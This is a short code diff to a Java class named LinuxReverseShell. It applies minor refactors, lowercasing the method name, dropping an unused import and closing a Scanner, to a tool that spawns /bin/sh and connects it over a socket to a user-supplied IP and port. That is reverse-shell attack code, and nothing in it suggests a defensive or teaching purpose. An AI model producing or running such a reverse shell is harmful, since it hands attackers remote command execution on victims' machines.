@@ -5,11 +5,9 @@ import java.io.OutputStream;
 import java.net.Socket;
 import java.util.Scanner;
 
-import controller.Controller;
-
 public class LinuxReverseShell {
 
-	public static void LinuxReverseShell(int port, String ip) throws Exception {
+	public static void linuxReverseShell(int port, String ip) throws Exception {
 	    String host=ip;
 	    //int port=9999;
 	    String cmd="/bin/sh";
@@ -44,7 +42,8 @@ public class LinuxReverseShell {
 	String ip = inputScanner.nextLine();
 	System.out.println("Please input the listening port");
 	int port = Integer.parseInt(inputScanner.nextLine());	//int x = Integer.parseInt(input);
-	LinuxReverseShell(port, ip);
+	linuxReverseShell(port, ip);
+	inputScanner.close();
 	}
 }
 
